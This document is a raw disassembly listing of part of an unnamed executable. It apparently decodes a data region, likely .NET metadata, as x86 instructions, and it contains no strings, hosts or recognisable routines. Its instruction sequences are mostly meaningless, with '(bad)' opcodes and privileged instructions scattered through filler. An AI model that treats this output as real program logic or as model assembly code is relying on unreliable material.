  405cfc:	55                   	push   %ebp
  405cfd:	00 06                	add    %al,(%esi)
  405cff:	00 76 06             	add    %dh,0x6(%esi)
  405d02:	66 02 06             	data16 add (%esi),%al
  405d05:	00 78 0f             	add    %bh,0xf(%eax)
  405d08:	66 02 06             	data16 add (%esi),%al
  405d0b:	00 0c 05 66 02 06 00 	add    %cl,0x60266(,%eax,1)
  405d12:	7f 14                	jg     0x405d28
  405d14:	66 02 06             	data16 add (%esi),%al
  405d17:	00 2e                	add    %ch,(%esi)
  405d19:	12 66 02             	adc    0x2(%esi),%ah
  405d1c:	16                   	push   %ss
  405d1d:	00 47 12             	add    %al,0x12(%edi)
  405d20:	66 15 1a 00          	adc    $0x1a,%ax
  405d24:	fe                   	(bad)
  405d25:	13 87 1a 1a 00 83    	adc    -0x7cffe5e6(%edi),%eax
  405d2b:	11 87 1a 8b 01 b7    	adc    %eax,-0x48fe74e6(%edi)
  405d31:	14 00                	adc    $0x0,%al
  405d33:	00 1a                	add    %bl,(%edx)
  405d35:	00 23                	add    %ah,(%ebx)
  405d37:	19 87 1a 06 00 3e    	sbb    %eax,0x3e00061a(%edi)
  405d3d:	15 f6 0f 06 00       	adc    $0x60ff6,%eax
  405d42:	7a 00                	jp     0x405d44
  405d44:	f6 0f 06             	testb  $0x6,(%edi)
  405d47:	00 ed                	add    %ch,%ch
  405d49:	0f f6 0f             	psadbw (%edi),%mm1
  405d4c:	06                   	push   %es
  405d4d:	00 da                	add    %bl,%dl
  405d4f:	00 f6                	add    %dh,%dh
  405d51:	0f 06                	clts
  405d53:	00 e6                	add    %ah,%dh
  405d55:	12 00                	adc    (%eax),%al
  405d57:	1d 06 00 35 10       	sbb    $0x10350006,%eax
  405d5c:	00 1d 06 00 b1 07    	add    %bl,0x7b10006
  405d62:	f6 0f 06             	testb  $0x6,(%edi)
  405d65:	00 88 10 f6 0f 1e    	add    %cl,0x1e0ff610(%eax)
  405d6b:	00 2c 11             	add    %ch,(%ecx,%edx,1)
  405d6e:	ae                   	scas   %es:(%edi),%al
  405d6f:	17                   	pop    %ss
  405d70:	06                   	push   %es
  405d71:	00 a1 1d c0 0e 06    	add    %ah,0x60ec01d(%ecx)
  405d77:	00 da                	add    %bl,%dl
  405d79:	0e                   	push   %cs
  405d7a:	c0 0e 06             	rorb   $0x6,(%esi)
  405d7d:	00 84 06 c0 0e 06 00 	add    %al,0x60ec0(%esi,%eax,1)
  405d84:	79 03                	jns    0x405d89
  405d86:	f6 0f 06             	testb  $0x6,(%edi)
  405d89:	00 24 06             	add    %ah,(%esi,%eax,1)
  405d8c:	a0 0b 0a 00 17       	mov    0x17000a0b,%al
  405d91:	14 55                	adc    $0x55,%al
  405d93:	00 0a                	add    %cl,(%edx)
  405d95:	00 9b 18 55 00 06    	add    %bl,0x6005518(%ebx)
  405d9b:	00 da                	add    %bl,%dl
  405d9d:	04 55                	add    $0x55,%al
  405d9f:	00 43 00             	add    %al,0x0(%ebx)
  405da2:	f4                   	hlt
  405da3:	14 00                	adc    $0x0,%al
  405da5:	00 12                	add    %dl,(%edx)
  405da7:	00 a7 05 c2 12 06    	add    %ah,0x612c205(%edi)
  405dad:	00 12                	add    %dl,(%edx)
  405daf:	00 cb                	add    %cl,%bl
  405db1:	02 06                	add    (%esi),%al
  405db3:	00 ba 10 f6 0f 06    	add    %bh,0x60ff610(%edx)
  405db9:	00 1d 1d 57 11 06    	add    %bl,0x611571d
  405dbf:	00 3d 08 f6 0f 06    	add    %bh,0x60ff608
  405dc5:	00 ff                	add    %bh,%bh
  405dc7:	14 f6                	adc    $0xf6,%al
  405dc9:	0f 06                	clts
  405dcb:	00 00                	add    %al,(%eax)
  405dcd:	06                   	push   %es
  405dce:	f6 0f 22             	testb  $0x22,(%edi)
  405dd1:	00 54 12 5d          	add    %dl,0x5d(%edx,%edx,1)
  405dd5:	13 22                	adc    (%edx),%esp
  405dd7:	00 d5                	add    %dl,%ch
  405dd9:	16                   	push   %ss
  405dda:	5d                   	pop    %ebp
  405ddb:	13 22                	adc    (%edx),%esp
  405ddd:	00 84 13 5d 13 12 00 	add    %al,0x12135d(%ebx,%edx,1)
  405de4:	7c 13                	jl     0x405df9
  405de6:	a3 15 22 00 ed       	mov    %eax,0xed002215
  405deb:	16                   	push   %ss
  405dec:	5d                   	pop    %ebp
  405ded:	13 06                	adc    (%esi),%eax
  405def:	00 5d 16             	add    %bl,0x16(%ebp)
  405df2:	00 1d 06 00 f3 11    	add    %bl,0x11f30006
  405df8:	f6 0f 06             	testb  $0x6,(%edi)
  405dfb:	00 64 16 00          	add    %ah,0x0(%esi,%edx,1)
  405dff:	1d 12 00 18 13       	sbb    $0x13180012,%eax
  405e04:	00 1d 06 00 ac 0f    	add    %bl,0xfac0006
  405e0a:	00 1d 06 00 fb 00    	add    %bl,0xfb0006
  405e10:	00 1d 06 00 dd 11    	add    %bl,0x11dd0006
  405e16:	f6 0f 06             	testb  $0x6,(%edi)
  405e19:	00 0e                	add    %cl,(%esi)
  405e1b:	10 00                	adc    %al,(%eax)
  405e1d:	1d 06 00 51 05       	sbb    $0x5510006,%eax
  405e22:	00 1d 06 00 15 05    	add    %bl,0x5150006
  405e28:	00 1d 06 00 4f 10    	add    %bl,0x104f0006
  405e2e:	00 1d 06 00 30 05    	add    %bl,0x5300006
  405e34:	00 1d 06 00 c6 11    	add    %bl,0x11c60006
  405e3a:	00 1d 06 00 a5 13    	add    %bl,0x13a50006
  405e40:	f6 0f 06             	testb  $0x6,(%edi)
  405e43:	00 93 1c f6 0f 06    	add    %dl,0x60ff61c(%ebx)
  405e49:	00 07                	add    %al,(%edi)
  405e4b:	18 a3 15 06 00 dd    	sbb    %ah,-0x22fff9eb(%ebx)
  405e51:	05 f6 0f 06 00       	add    $0x60ff6,%eax
  405e56:	30 03                	xor    %al,(%ebx)
  405e58:	00 1d 06 00 c7 00    	add    %bl,0xc70006
  405e5e:	f6 0f 06             	testb  $0x6,(%edi)
  405e61:	00 cb                	add    %cl,%bl
  405e63:	05 f6 0f 06 00       	add    $0x60ff6,%eax
  405e68:	49                   	dec    %ecx
  405e69:	06                   	push   %es
  405e6a:	f6 0f 06             	testb  $0x6,(%edi)
  405e6d:	00 36                	add    %dh,(%esi)
  405e6f:	18 66 02             	sbb    %ah,0x2(%esi)
  405e72:	06                   	push   %es
  405e73:	00 42 08             	add    %al,0x8(%edx)
  405e76:	66 02 0a             	data16 add (%edx),%cl
  405e79:	00 b9 0f 16 11 0a    	add    %bh,0xa11160f(%ecx)
  405e7f:	00 41 05             	add    %al,0x5(%ecx)
  405e82:	16                   	push   %ss
  405e83:	11 00                	adc    %eax,(%eax)
  405e85:	00 00                	add    %al,(%eax)
  405e87:	00 40 01             	add    %al,0x1(%eax)
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	00 00                	add    %al,(%eax)
  405e8e:	01 00                	add    %eax,(%eax)
  405e90:	01 00                	add    %eax,(%eax)
  405e92:	01 00                	add    %eax,(%eax)
  405e94:	10 00                	adc    %al,(%eax)
  405e96:	d1 0f                	rorl   $1,(%edi)
  405e98:	80 1a 05             	sbbb   $0x5,(%edx)
  405e9b:	00 01                	add    %al,(%ecx)
  405e9d:	00 01                	add    %al,(%ecx)
  405e9f:	00 81 01 10 00 19    	add    %al,0x19001001(%ecx)
  405ea5:	17                   	pop    %ss
  405ea6:	80 1a 05             	sbbb   $0x5,(%edx)
  405ea9:	00 01                	add    %al,(%ecx)
  405eab:	00 03                	add    %al,(%ebx)
  405ead:	00 81 01 10 00 a1    	add    %al,-0x5effefff(%ecx)
  405eb3:	19 9e 11 05 00 13    	sbb    %ebx,0x13000511(%esi)
  405eb9:	00 06                	add    %al,(%esi)
  405ebb:	00 00                	add    %al,(%eax)
  405ebd:	00 10                	add    %dl,(%eax)
  405ebf:	00 b4 12 0e 0f 05 00 	add    %dh,0x50f0e(%edx,%edx,1)
  405ec6:	1e                   	push   %ds
  405ec7:	00 24 00             	add    %ah,(%eax,%eax,1)
  405eca:	00 00                	add    %al,(%eax)
  405ecc:	10 00                	adc    %al,(%eax)
  405ece:	39 17                	cmp    %edx,(%edi)
  405ed0:	3d 14 05 00 1e       	cmp    $0x1e000514,%eax
  405ed5:	00 26                	add    %ah,(%esi)
  405ed7:	00 81 01 10 00 90    	add    %al,-0x6fffefff(%ecx)
  405edd:	10 3d 14 05 00 1e    	adc    %bh,0x1e000514
  405ee3:	00 2d 00 81 01 10    	add    %ch,0x10018100
  405ee9:	00 4d 13             	add    %cl,0x13(%ebp)
  405eec:	3d 14 05 00 1e       	cmp    $0x1e000514,%eax
  405ef1:	00 2f                	add    %ch,(%edi)
  405ef3:	00 81 01 10 00 5e    	add    %al,0x5e001001(%ecx)
  405ef9:	15 3d 14 05 00       	adc    $0x5143d,%eax
  405efe:	1e                   	push   %ds
  405eff:	00 30                	add    %dh,(%eax)
  405f01:	00 81 01 10 00 5d    	add    %al,0x5d001001(%ecx)
  405f07:	0f 3d                	(bad)
  405f09:	14 05                	adc    $0x5,%al
  405f0b:	00 1e                	add    %bl,(%esi)
  405f0d:	00 36                	add    %dh,(%esi)
  405f0f:	00 81 01 10 00 58    	add    %al,0x58001001(%ecx)
  405f15:	15 3d 14 05 00       	adc    $0x5143d,%eax
  405f1a:	1f                   	pop    %ds
  405f1b:	00 38                	add    %bh,(%eax)
  405f1d:	00 02                	add    %al,(%edx)
  405f1f:	01 00                	add    %eax,(%eax)
  405f21:	00 01                	add    %al,(%ecx)
  405f23:	02 00                	add    (%eax),%al
  405f25:	00 39                	add    %bh,(%ecx)
  405f27:	00 1f                	add    %bl,(%edi)
  405f29:	00 3e                	add    %bh,(%esi)
  405f2b:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  405f31:	0e                   	push   %cs
  405f32:	3d 14 05 00 23       	cmp    $0x23000514,%eax
  405f37:	00 3e                	add    %bh,(%esi)
  405f39:	00 81 01 10 00 67    	add    %al,0x67001001(%ecx)
  405f3f:	1d 3d 14 05 00       	sbb    $0x5143d,%eax
  405f44:	23 00                	and    (%eax),%eax
  405f46:	41                   	inc    %ecx
  405f47:	00 81 01 10 00 9a    	add    %al,-0x65ffefff(%ecx)
  405f4d:	19 7c 19 05          	sbb    %edi,0x5(%ecx,%ebx,1)
  405f51:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f54:	46                   	inc    %esi
  405f55:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 05 00 25 00 4b    	add    %al,0x4b002500
  405f63:	00 01                	add    %al,(%ecx)
  405f65:	00 10                	add    %dl,(%eax)
  405f67:	00 0d 01 fd 0f 05    	add    %cl,0x50ffd01
  405f6d:	00 26                	add    %ah,(%esi)
  405f6f:	00 4b 00             	add    %cl,0x0(%ebx)
  405f72:	81 01 10 00 06 01    	addl   $0x1060010,(%ecx)
  405f78:	fd                   	std
  405f79:	0f 05                	syscall
  405f7b:	00 2d 00 52 00 00    	add    %ch,0x5200
  405f81:	01 00                	add    %eax,(%eax)
  405f83:	00 58 01             	add    %bl,0x1(%eax)
  405f86:	00 00                	add    %al,(%eax)
  405f88:	05 00 2d 00 54       	add    $0x54002d00,%eax
  405f8d:	00 13                	add    %dl,(%ebx)
  405f8f:	01 00                	add    %eax,(%eax)
  405f91:	00 38                	add    %bh,(%eax)
  405f93:	00 00                	add    %al,(%eax)
  405f95:	00 51 00             	add    %dl,0x0(%ecx)
  405f98:	2e 00 54 00 01       	add    %dl,%cs:0x1(%eax,%eax,1)
  405f9d:	00 10                	add    %dl,(%eax)
  405f9f:	00 a3 17 c7 0d 05    	add    %ah,0x50dc717(%ebx)
  405fa5:	00 2e                	add    %ch,(%esi)
  405fa7:	00 54 00 01          	add    %dl,0x1(%eax,%eax,1)
  405fab:	00 10                	add    %dl,(%eax)
  405fad:	00 60 10             	add    %ah,0x10(%eax)
  405fb0:	c7                   	(bad)
  405fb1:	0d 05 00 2f 00       	or     $0x2f0005,%eax
  405fb6:	5f                   	pop    %edi
  405fb7:	00 01                	add    %al,(%ecx)
  405fb9:	00 10                	add    %dl,(%eax)
  405fbb:	00 6d 1c             	add    %ch,0x1c(%ebp)
  405fbe:	c7                   	(bad)
  405fbf:	0d 05 00 31 00       	or     $0x310005,%eax
  405fc4:	63 00                	arpl   %eax,(%eax)
  405fc6:	01 00                	add    %eax,(%eax)
  405fc8:	10 00                	adc    %al,(%eax)
  405fca:	e2 0d                	loop   0x405fd9
  405fcc:	c7                   	(bad)
  405fcd:	0d 05 00 33 00       	or     $0x330005,%eax
  405fd2:	6a 00                	push   $0x0
  405fd4:	01 01                	add    %eax,(%ecx)
  405fd6:	00 00                	add    %al,(%eax)
  405fd8:	16                   	push   %ss
  405fd9:	08 c7                	or     %al,%bh
  405fdb:	0d 39 00 3a 00       	or     $0x3a0039,%eax
  405fe0:	95                   	xchg   %eax,%ebp
  405fe1:	00 00                	add    %al,(%eax)
  405fe3:	00 10                	add    %dl,(%eax)
  405fe5:	00 8e 17 c7 0d 05    	add    %cl,0x50dc717(%esi)
  405feb:	00 47 00             	add    %al,0x0(%edi)
  405fee:	95                   	xchg   %eax,%ebp
  405fef:	00 00                	add    %al,(%eax)
  405ff1:	00 10                	add    %dl,(%eax)
  405ff3:	00 98 17 c7 0d 05    	add    %bl,0x50dc717(%eax)
  405ff9:	00 47 00             	add    %al,0x0(%edi)
  405ffc:	99                   	cltd
  405ffd:	00 81 01 10 00 8e    	add    %al,-0x71ffefff(%ecx)
  406003:	12 c7                	adc    %bh,%al
  406005:	0d 05 00 47 00       	or     $0x470005,%eax
  40600a:	a2 00 00 01 00       	mov    %al,0x10000
  40600f:	00 49 01             	add    %cl,0x1(%ecx)
  406012:	00 00                	add    %al,(%eax)
  406014:	05 00 47 00 a4       	add    $0xa4004700,%eax
  406019:	00 13                	add    %dl,(%ebx)
  40601b:	01 00                	add    %eax,(%eax)
  40601d:	00 1b                	add    %bl,(%ebx)
  40601f:	01 00                	add    %eax,(%eax)
  406021:	00 51 00             	add    %dl,0x0(%ecx)
  406024:	48                   	dec    %eax
  406025:	00 a4 00 16 00 a8 18 	add    %ah,0x18a80016(%eax,%eax,1)
  40602c:	12 00                	adc    (%eax),%al
  40602e:	16                   	push   %ss
  40602f:	00 b5 18 12 00 16    	add    %dh,0x16001218(%ebp)
  406035:	00 0e                	add    %cl,(%esi)
  406037:	11 12                	adc    %edx,(%edx)
  406039:	00 16                	add    %dl,(%esi)
  40603b:	00 15 0f 12 00 16    	add    %dl,0x1600120f
  406041:	00 3f                	add    %bh,(%edi)
  406043:	13 12                	adc    (%edx),%edx
  406045:	00 16                	add    %dl,(%esi)
  406047:	00 50 06             	add    %dl,0x6(%eax)
  40604a:	12 00                	adc    (%eax),%al
  40604c:	16                   	push   %ss
  40604d:	00 f7                	add    %dh,%bh
  40604f:	1c 12                	sbb    $0x12,%al
  406051:	00 16                	add    %dl,(%esi)
  406053:	00 a1 02 12 00 16    	add    %ah,0x16001202(%ecx)
  406059:	00 a5 08 12 00 16    	add    %ah,0x16001208(%ebp)
  40605f:	00 58 08             	add    %bl,0x8(%eax)
  406062:	12 00                	adc    (%eax),%al
  406064:	16                   	push   %ss
  406065:	00 9f 08 15 00 16    	add    %bl,0x16001508(%edi)
  40606b:	00 ab 0d 12 00 16    	add    %ch,0x1600120d(%ebx)
  406071:	00 14 01             	add    %dl,(%ecx,%eax,1)
  406074:	19 00                	sbb    %eax,(%eax)
  406076:	16                   	push   %ss
  406077:	00 d6                	add    %dl,%dh
  406079:	10 12                	adc    %dl,(%edx)
  40607b:	00 16                	add    %dl,(%esi)
  40607d:	00 75 02             	add    %dh,0x2(%ebp)
  406080:	12 00                	adc    (%eax),%al
  406082:	16                   	push   %ss
  406083:	00 7e 03             	add    %bh,0x3(%esi)
  406086:	12 00                	adc    (%eax),%al
  406088:	16                   	push   %ss
  406089:	00 4c 1c 12          	add    %cl,0x12(%esp,%ebx,1)
  40608d:	00 16                	add    %dl,(%esi)
  40608f:	00 ae 12 12 00 11    	add    %ch,0x11001212(%esi)
  406095:	00 8a 04 21 00 11    	add    %cl,0x11002104(%edx)
  40609b:	00 6f 04             	add    %ch,0x4(%edi)
  40609e:	25 00 11 00 3f       	and    $0x3f001100,%eax
  4060a3:	04 29                	add    $0x29,%al
  4060a5:	00 11                	add    %dl,(%ecx)
  4060a7:	00 d5                	add    %dl,%ch
  4060a9:	03 2d 00 11 00 57    	add    0x57001100,%ebp
  4060af:	04 2d                	add    $0x2d,%al
  4060b1:	00 11                	add    %dl,(%ecx)
  4060b3:	00 ba 03 30 00 11    	add    %bh,0x11003003(%edx)
  4060b9:	00 9d 03 34 00 31    	add    %bl,0x31003403(%ebp)
  4060bf:	00 83 03 37 00 11    	add    %al,0x11003703(%ebx)
  4060c5:	00 f1                	add    %dh,%cl
  4060c7:	03 30                	add    (%eax),%esi
  4060c9:	00 11                	add    %dl,(%ecx)
  4060cb:	00 25 04 3a 00 11    	add    %ah,0x11003a04
  4060d1:	00 07                	add    %al,(%edi)
  4060d3:	04 34                	add    $0x34,%al
  4060d5:	00 16                	add    %dl,(%esi)
  4060d7:	00 92 12 dc 00 06    	add    %dl,0x600dc12(%edx)
  4060dd:	06                   	push   %es
  4060de:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4060df:	02 06                	add    (%esi),%al
  4060e1:	01 56 80             	add    %edx,-0x80(%esi)
  4060e4:	7a 02                	jp     0x4060e8
  4060e6:	09 01                	or     %eax,(%ecx)
  4060e8:	56                   	push   %esi
  4060e9:	80 ce 01             	or     $0x1,%dh
  4060ec:	09 01                	or     %eax,(%ecx)
  4060ee:	56                   	push   %esi
  4060ef:	80 bb 01 09 01 31 00 	cmpb   $0x0,0x31010901(%ebx)
  4060f6:	fe 01                	incb   (%ecx)
  4060f8:	12 00                	adc    (%eax),%al
  4060fa:	16                   	push   %ss
  4060fb:	00 57 17             	add    %dl,0x17(%edi)
  4060fe:	30 01                	xor    %al,(%ecx)
  406100:	16                   	push   %ss
  406101:	00 0b                	add    %cl,(%ebx)
  406103:	00 43 01             	add    %al,0x1(%ebx)
  406106:	51                   	push   %ecx
  406107:	80 9d 0d 3a 00 51 80 	sbbb   $0x80,0x51003a0d(%ebp)
  40610e:	99                   	cltd
  40610f:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  406114:	90                   	nop
  406115:	0d 3a 00 51 80       	or     $0x8051003a,%eax
  40611a:	74 0d                	je     0x406129
  40611c:	3a 00                	cmp    (%eax),%al
  40611e:	21 00                	and    %eax,(%eax)
  406120:	fb                   	sti
  406121:	1c 29                	sbb    $0x29,%al
  406123:	00 21                	add    %ah,(%ecx)
  406125:	00 dc                	add    %bl,%ah
  406127:	1c 29                	sbb    $0x29,%al
  406129:	00 31                	add    %dh,(%ecx)
  40612b:	00 fc                	add    %bh,%ah
  40612d:	19 29                	sbb    %ebp,(%ecx)
  40612f:	00 33                	add    %dh,(%ebx)
  406131:	01 77 01             	add    %esi,0x1(%edi)
  406134:	8b 01                	mov    (%ecx),%eax
  406136:	11 00                	adc    %eax,(%eax)
  406138:	67 05 8f 01 01 00    	addr16 add $0x1018f,%eax
  40613e:	9c                   	pushf
  40613f:	10 30                	adc    %dh,(%eax)
  406141:	01 01                	add    %eax,(%ecx)
  406143:	00 bd 11 3a 00 01    	add    %bh,0x1003a11(%ebp)
  406149:	00 9c 10 30 01 01 00 	add    %bl,0x10130(%eax,%edx,1)
  406150:	37                   	aaa
  406151:	14 c7                	adc    $0xc7,%al
  406153:	01 01                	add    %eax,(%ecx)
  406155:	00 ac 07 12 00 01 00 	add    %ch,0x10012(%edi,%eax,1)
  40615c:	8c 07                	mov    %es,(%edi)
  40615e:	12 00                	adc    (%eax),%al
  406160:	01 00                	add    %eax,(%eax)
  406162:	ae                   	scas   %es:(%edi),%al
  406163:	0a 37                	or     (%edi),%dh
  406165:	00 01                	add    %al,(%ecx)
  406167:	00 0c 08             	add    %cl,(%eax,%ecx,1)
  40616a:	02 02                	add    (%edx),%al
  40616c:	01 00                	add    %eax,(%eax)
  40616e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40616f:	1a c7                	sbb    %bh,%al
  406171:	01 01                	add    %eax,(%ecx)
  406173:	00 9c 10 30 01 01 00 	add    %bl,0x10130(%eax,%edx,1)
  40617a:	8e 1c 06             	mov    (%esi,%eax,1),%ds
  40617d:	02 06                	add    (%esi),%al
  40617f:	06                   	push   %es
  406180:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406181:	02 3a                	add    (%edx),%bh
  406183:	00 56 80             	add    %dl,-0x80(%esi)
  406186:	05 12 02 02 56       	add    $0x56020212,%eax
  40618b:	80 58 0f 02          	sbbb   $0x2,0xf(%eax)
  40618f:	02 56 80             	add    -0x80(%esi),%dl
  406192:	7d 12                	jge    0x4061a6
  406194:	02 02                	add    (%edx),%al
  406196:	56                   	push   %esi
  406197:	80 93 1c 02 02 56 80 	adcb   $0x80,0x5602021c(%ebx)
  40619e:	cb                   	lret
  40619f:	0c 02                	or     $0x2,%al
  4061a1:	02 56 80             	add    -0x80(%esi),%dl
  4061a4:	e7 13                	out    %eax,$0x13
  4061a6:	02 02                	add    (%edx),%al
  4061a8:	56                   	push   %esi
  4061a9:	80 c7 00             	add    $0x0,%bh
  4061ac:	02 02                	add    (%edx),%al
  4061ae:	56                   	push   %esi
  4061af:	80 88 10 02 02 56 80 	orb    $0x80,0x56020210(%eax)
  4061b6:	12 19                	adc    (%ecx),%bl
  4061b8:	02 02                	add    (%edx),%al
  4061ba:	56                   	push   %esi
  4061bb:	80 49 06 02          	orb    $0x2,0x6(%ecx)
  4061bf:	02 56 80             	add    -0x80(%esi),%dl
  4061c2:	b1 07                	mov    $0x7,%cl
  4061c4:	02 02                	add    (%edx),%al
  4061c6:	56                   	push   %esi
  4061c7:	80 4c 1d 02 02       	orb    $0x2,0x2(%ebp,%ebx,1)
  4061cc:	33 01                	xor    (%ecx),%eax
  4061ce:	11 02                	adc    %eax,(%edx)
  4061d0:	fd                   	std
  4061d1:	02 08                	add    (%eax),%cl
  4061d3:	26 00 00             	add    %al,%es:(%eax)
  4061d6:	00 00                	add    %al,(%eax)
  4061d8:	96                   	xchg   %eax,%esi
  4061d9:	00 a5 10 0a 00 01    	add    %ah,0x1000a10(%ebp)
  4061df:	00 78 20             	add    %bh,0x20(%eax)
  4061e2:	00 00                	add    %al,(%eax)
  4061e4:	00 00                	add    %al,(%eax)
  4061e6:	86 18                	xchg   %bl,(%eax)
  4061e8:	09 15 0e 00 01 00    	or     %edx,0x1000e
  4061ee:	f8                   	clc
  4061ef:	26 00 00             	add    %al,%es:(%eax)
  4061f2:	00 00                	add    %al,(%eax)
  4061f4:	96                   	xchg   %eax,%esi
  4061f5:	00 0f                	add    %cl,(%edi)
  4061f7:	17                   	pop    %ss
  4061f8:	1d 00 01 00 50       	sbb    $0x50000100,%eax
  4061fd:	28 00                	sub    %al,(%eax)
  4061ff:	00 00                	add    %al,(%eax)
  406201:	00 91 00 3f 0d 1d    	add    %dl,0x1d0d3f00(%ecx)
  406207:	00 01                	add    %al,(%ecx)
  406209:	00 c0                	add    %al,%al
  40620b:	28 00                	sub    %al,(%eax)
  40620d:	00 00                	add    %al,(%eax)
  40620f:	00 91 18 0f 15 0a    	add    %dl,0xa150f18(%ecx)
  406215:	00 01                	add    %al,(%ecx)
  406217:	00 80 20 00 00 00    	add    %al,0x20(%eax)
  40621d:	00 96 08 56 1a 3d    	add    %dl,0x3d1a5608(%esi)
  406223:	00 01                	add    %al,(%ecx)
  406225:	00 87 20 00 00 00    	add    %al,0x20(%edi)
  40622b:	00 96 08 64 1a 42    	add    %dl,0x421a6408(%esi)
  406231:	00 01                	add    %al,(%ecx)
  406233:	00 8f 20 00 00 00    	add    %cl,0x20(%edi)
  406239:	00 96 08 3a 1a 48    	add    %dl,0x481a3a08(%esi)
  40623f:	00 02                	add    %al,(%edx)
  406241:	00 96 20 00 00 00    	add    %dl,0x20(%esi)
  406247:	00 96 08 48 1a 4d    	add    %dl,0x4d1a4808(%esi)
  40624d:	00 02                	add    %al,(%edx)
  40624f:	00 9e 20 00 00 00    	add    %bl,0x20(%esi)
  406255:	00 91 08 96 13 53    	add    %dl,0x53139608(%ecx)
  40625b:	00 03                	add    %al,(%ebx)
  40625d:	00 a5 20 00 00 00    	add    %ah,0x20(%ebp)
  406263:	00 91 08 a1 13 58    	add    %dl,0x5813a108(%ecx)
  406269:	00 03                	add    %al,(%ebx)
  40626b:	00 ad 20 00 00 00    	add    %ch,0x20(%ebp)
  406271:	00 91 08 1e 0b 5e    	add    %dl,0x5e0b1e08(%ecx)
  406277:	00 04 00             	add    %al,(%eax,%eax,1)
  40627a:	b4 20                	mov    $0x20,%ah
  40627c:	00 00                	add    %al,(%eax)
  40627e:	00 00                	add    %al,(%eax)
  406280:	91                   	xchg   %eax,%ecx
  406281:	08 2d 0b 62 00 04    	or     %ch,0x400620b
  406287:	00 bc 20 00 00 00 00 	add    %bh,0x0(%eax,%eiz,1)
  40628e:	91                   	xchg   %eax,%ecx
  40628f:	08 d3                	or     %dl,%bl
  406291:	19 5e 00             	sbb    %ebx,0x0(%esi)
  406294:	05 00 c3 20 00       	add    $0x20c300,%eax
  406299:	00 00                	add    %al,(%eax)
  40629b:	00 91 08 de 19 62    	add    %dl,0x6219de08(%ecx)
  4062a1:	00 05 00 cb 20 00    	add    %al,0x20cb00
  4062a7:	00 00                	add    %al,(%eax)
  4062a9:	00 91 08 d1 0a 67    	add    %dl,0x670ad108(%ecx)
  4062af:	00 06                	add    %al,(%esi)
  4062b1:	00 d2                	add    %dl,%dl
  4062b3:	20 00                	and    %al,(%eax)
  4062b5:	00 00                	add    %al,(%eax)
  4062b7:	00 91 08 df 0a 6c    	add    %dl,0x6c0adf08(%ecx)
  4062bd:	00 06                	add    %al,(%esi)
  4062bf:	00 da                	add    %bl,%dl
  4062c1:	20 00                	and    %al,(%eax)
  4062c3:	00 00                	add    %al,(%eax)
  4062c5:	00 96 08 4c 03 1d    	add    %dl,0x1d034c08(%esi)
  4062cb:	00 07                	add    %al,(%edi)
  4062cd:	00 e1                	add    %ah,%cl
  4062cf:	20 00                	and    %al,(%eax)
  4062d1:	00 00                	add    %al,(%eax)
  4062d3:	00 96 08 5c 03 72    	add    %dl,0x72035c08(%esi)
  4062d9:	00 07                	add    %al,(%edi)
  4062db:	00 e9                	add    %ch,%cl
  4062dd:	20 00                	and    %al,(%eax)
  4062df:	00 00                	add    %al,(%eax)
  4062e1:	00 91 08 fc 02 77    	add    %dl,0x7702fc08(%ecx)
  4062e7:	00 08                	add    %cl,(%eax)
  4062e9:	00 f0                	add    %dh,%al
  4062eb:	20 00                	and    %al,(%eax)
  4062ed:	00 00                	add    %al,(%eax)
  4062ef:	00 91 08 8e 0b 67    	add    %dl,0x670b8e08(%ecx)
  4062f5:	00 08                	add    %cl,(%eax)
  4062f7:	00 f7                	add    %dh,%bh
  4062f9:	20 00                	and    %al,(%eax)
  4062fb:	00 00                	add    %al,(%eax)
  4062fd:	00 91 08 97 0b 6c    	add    %dl,0x6c0b9708(%ecx)
  406303:	00 08                	add    %cl,(%eax)
  406305:	00 ff                	add    %bh,%bh
  406307:	20 00                	and    %al,(%eax)
  406309:	00 00                	add    %al,(%eax)
  40630b:	00 96 08 f4 0e 7b    	add    %dl,0x7b0ef408(%esi)
  406311:	00 09                	add    %cl,(%ecx)
  406313:	00 06                	add    %al,(%esi)
  406315:	21 00                	and    %eax,(%eax)
  406317:	00 00                	add    %al,(%eax)
  406319:	00 96 08 01 0f 7f    	add    %dl,0x7f0f0108(%esi)
  40631f:	00 09                	add    %cl,(%ecx)
  406321:	00 0e                	add    %cl,(%esi)
  406323:	21 00                	and    %eax,(%eax)
  406325:	00 00                	add    %al,(%eax)
  406327:	00 96 08 eb 0c 1d    	add    %dl,0x1d0ceb08(%esi)
  40632d:	00 0a                	add    %cl,(%edx)
  40632f:	00 15 21 00 00 00    	add    %dl,0x21
  406335:	00 96 08 fc 0c 72    	add    %dl,0x720cfc08(%esi)
  40633b:	00 0a                	add    %cl,(%edx)
  40633d:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  406341:	00 00                	add    %al,(%eax)
  406343:	00 96 00 29 1a 0a    	add    %dl,0xa1a2900(%esi)
  406349:	00 0b                	add    %cl,(%ebx)
  40634b:	00 1d 21 00 00 00    	add    %bl,0x21
  406351:	00 91 00 6d 07 84    	add    %dl,-0x7bf89300(%ecx)
  406357:	00 0b                	add    %cl,(%ebx)
  406359:	00 28                	add    %ch,(%eax)
  40635b:	21 00                	and    %eax,(%eax)
  40635d:	00 00                	add    %al,(%eax)
  40635f:	00 91 00 97 08 89    	add    %dl,-0x76f76900(%ecx)
  406365:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406368:	b8 2c 00 00 00       	mov    $0x2c,%eax
  40636d:	00 96 00 58 19 0a    	add    %dl,0xa195800(%esi)
  406373:	00 10                	add    %dl,(%eax)
  406375:	00 40 2d             	add    %al,0x2d(%eax)
  406378:	00 00                	add    %al,(%eax)
  40637a:	00 00                	add    %al,(%eax)
  40637c:	96                   	xchg   %eax,%esi
  40637d:	00 ad 02 94 00 10    	add    %ch,0x10009402(%ebp)
  406383:	00 24 2f             	add    %ah,(%edi,%ebp,1)
  406386:	00 00                	add    %al,(%eax)
  406388:	00 00                	add    %al,(%eax)
  40638a:	96                   	xchg   %eax,%esi
  40638b:	00 ce                	add    %cl,%dh
  40638d:	04 58                	add    $0x58,%al
  40638f:	00 11                	add    %dl,(%ecx)
  406391:	00 5c 30 00          	add    %bl,0x0(%eax,%esi,1)
